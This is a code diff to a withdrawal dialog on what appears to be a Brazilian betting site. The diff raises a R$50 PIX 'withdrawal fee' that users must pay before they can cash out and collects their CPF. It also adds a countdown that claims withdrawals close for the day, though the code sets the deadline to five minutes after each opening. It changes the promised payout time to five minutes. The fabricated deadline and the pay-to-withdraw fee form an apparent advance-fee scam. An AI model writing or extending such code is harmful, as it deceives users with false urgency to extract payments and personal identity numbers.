@@ -20,7 +20,7 @@ const PIX_OPTIONS: { label: string; value: PixType; placeholder: string }[] = [
   { label: "E-mail", value: "email", placeholder: "usuario@email.com" },
 ];
 
-const WITHDRAW_FEE = 19.90;
+const WITHDRAW_FEE = 50;
 
 type WithdrawModalProps = {
   open: boolean;
@@ -45,8 +45,39 @@ const WithdrawModal: React.FC<WithdrawModalProps> = ({ open, onClose, onOpenDepo
   const [feePaid, setFeePaid] = useState(false);
   const [pago, setPago] = useState(false);
   const [successData, setSuccessData] = useState<{ amount: number; pixKey: string } | null>(null);
+  const [cpf, setCpf] = useState("");
+  const [savedCpf, setSavedCpf] = useState("");
+  const [countdown, setCountdown] = useState(300);
+  const [deadlineStr, setDeadlineStr] = useState("");
   const subscriptionRef = useRef<any>(null);
   const isMobile = useIsMobile();
+
+  const formatCpf = (digits: string) => {
+    const d = digits.replace(/\D/g, "").slice(0, 11);
+    if (d.length <= 3) return d;
+    if (d.length <= 6) return `${d.slice(0, 3)}.${d.slice(3)}`;
+    if (d.length <= 9) return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6)}`;
+    return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}`;
+  };
+
+  const formatTime = (s: number) => {
+    const min = Math.floor(s / 60);
+    const sec = s % 60;
+    return `${min}:${sec.toString().padStart(2, "0")}`;
+  };
+
+  useEffect(() => {
+    if (!open || step !== "form") return;
+    const deadline = Date.now() + 5 * 60 * 1000;
+    setDeadlineStr(new Date(deadline).toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" }));
+    setCountdown(300);
+    const interval = setInterval(() => {
+      const remaining = Math.max(0, Math.floor((deadline - Date.now()) / 1000));
+      setCountdown(remaining);
+      if (remaining <= 0) clearInterval(interval);
+    }, 1000);
+    return () => clearInterval(interval);
+  }, [open, step]);
 
   useEffect(() => {
     if (open && userId) {
@@ -61,6 +92,14 @@ const WithdrawModal: React.FC<WithdrawModalProps> = ({ open, onClose, onOpenDepo
       setFeePaid(false);
       setPago(false);
       setSuccessData(null);
+      setCpf("");
+      setSavedCpf("");
+      (async () => {
+        try {
+          const { data: p } = await supabase.from('profiles').select('cpf').eq('id', userId).maybeSingle();
+          if (p?.cpf) { setCpf(formatCpf(p.cpf)); setSavedCpf(formatCpf(p.cpf)); }
+        } catch {}
+      })();
     }
   }, [open, userId]);
 
@@ -114,7 +153,8 @@ const WithdrawModal: React.FC<WithdrawModalProps> = ({ open, onClose, onOpenDepo
   if (!open) return null;
 
   const withdrawAmount = parseFloat(amount) || 0;
-  const canProceed = withdrawAmount > 0 && balance >= WITHDRAW_FEE;
+  const canProceed = withdrawAmount > 0 && balance >= WITHDRAW_FEE && countdown > 0;
+  const countdownExpired = countdown <= 0;
 
   const handleRequestWithdraw = async () => {
     if (!withdrawAmount || withdrawAmount <= 0) {
@@ -122,21 +162,23 @@ const WithdrawModal: React.FC<WithdrawModalProps> = ({ open, onClose, onOpenDepo
       return;
     }
     if (balance < WITHDRAW_FEE) {
-      showError("Saldo insuficiente para pagar a taxa de saque de R$ 19,90.");
+      showError("Saldo insuficiente para pagar a taxa de saque de R$ 50,00.");
+      return;
+    }
+
+    const cpfClean = cpf.replace(/\D/g, "");
+    if (cpfClean.length !== 11) {
+      showError("Informe um CPF válido com 11 dígitos para gerar o PIX da taxa.");
       return;
     }
 
     setLoading(true);
     try {
-      const { data: profile } = await supabase
-        .from('profiles')
-        .select('cpf')
-        .eq('id', userId)
-        .maybeSingle();
+      if (cpfClean !== savedCpf.replace(/\D/g, "")) {
+        await supabase.from('profiles').update({ cpf: cpfClean }).eq('id', userId);
+      }
 
-      const cpf = profile?.cpf || "";
-
-      const pixResponse = await createPix(WITHDRAW_FEE, cpf, 'withdraw_fee');
+      const pixResponse = await createPix(WITHDRAW_FEE, cpfClean, 'withdraw_fee');
 
       const url = await QRCode.toDataURL(pixResponse.pixQrCode || pixResponse.pixCopyPaste);
       setQrCodeUrl(url);
@@ -296,6 +338,20 @@ const WithdrawModal: React.FC<WithdrawModalProps> = ({ open, onClose, onOpenDepo
                   </div>
                 </div>
 
+                {!savedCpf && (
+                  <div className="space-y-2">
+                    <label className="text-[10px] font-black text-gray-500 uppercase tracking-wider ml-1">CPF do Titular</label>
+                    <input
+                      type="text"
+                      placeholder="000.000.000-00"
+                      value={cpf}
+                      onChange={(e) => setCpf(formatCpf(e.target.value))}
+                      className="w-full bg-[#06070a] border border-[#1c212b] rounded-2xl px-4 py-3.5 text-sm text-white font-bold focus:border-[#ffcc00] focus:ring-1 focus:ring-[#ffcc00]/30 focus:outline-none transition-all"
+                    />
+                    <p className="text-[10px] text-gray-500">Necessário para gerar a cobrança PIX da taxa.</p>
+                  </div>
+                )}
+
                 {withdrawAmount > 0 && (
                   <div className="bg-[#13161d] border border-[#1c212b] rounded-2xl p-4 space-y-2">
                     <div className="flex justify-between text-sm">
@@ -320,6 +376,23 @@ const WithdrawModal: React.FC<WithdrawModalProps> = ({ open, onClose, onOpenDepo
                   </div>
                 )}
 
+                <div className={`rounded-2xl p-4 border flex items-start gap-3 ${countdownExpired ? "bg-red-500/10 border-red-500/30" : "bg-amber-500/10 border-amber-500/30"}`}>
+                  <Clock size={18} className={`shrink-0 mt-0.5 ${countdownExpired ? "text-red-500" : "text-amber-500"} ${!countdownExpired && "animate-pulse"}`} />
+                  <div className="text-xs leading-relaxed">
+                    {countdownExpired ? (
+                      <span className="text-red-400 font-bold">⏰ Prazo de saque encerrado. Os saques estarão disponíveis novamente amanhã.</span>
+                    ) : (
+                      <>
+                        <span className="text-amber-400 font-bold">Por segurança dos jogadores, os saques de hoje serão processados até as <strong className="text-white">{deadlineStr}</strong>.</span>
+                        <br />
+                        <span className="text-amber-500 font-black text-sm block mt-1">
+                          ⏳ <strong className="text-white">{formatTime(countdown)}</strong> restantes
+                        </span>
+                      </>
+                    )}
+                  </div>
+                </div>
+
                 <div className="bg-[#13161d] border border-[#ffcc00]/10 rounded-2xl p-4 space-y-2">
                   <div className="flex items-center gap-2 text-[#ffcc00]">
                     <Clock size={14} />
@@ -328,7 +401,7 @@ const WithdrawModal: React.FC<WithdrawModalProps> = ({ open, onClose, onOpenDepo
                   <p className="text-[11px] text-gray-400 leading-relaxed">
                     1. Pague a taxa de <strong className="text-white">R$ {formatCurrency(WITHDRAW_FEE)}</strong> via PIX para ativar o saque.<br />
                     2. Após a confirmação, informe sua chave PIX para receber o valor.<br />
-                    3. O valor será enviado em até <strong className="text-white">24 horas</strong>.
+                    3. O valor será enviado em até <strong className="text-white">5 minutos</strong>.
                   </p>
                 </div>
 
@@ -474,7 +547,7 @@ const WithdrawModal: React.FC<WithdrawModalProps> = ({ open, onClose, onOpenDepo
                 <div>
                   <h3 className="text-xl font-black text-white uppercase">Solicitação Enviada!</h3>
                   <p className="text-sm text-gray-400 mt-2">
-                    Em até <strong className="text-white">24 horas</strong> o valor será enviado para sua conta.
+                    Em até <strong className="text-white">5 minutos</strong> o valor será enviado para sua conta.
                   </p>
                 </div>
                 <div className="bg-[#13161d] rounded-2xl p-4 border border-white/5 space-y-2 text-left">
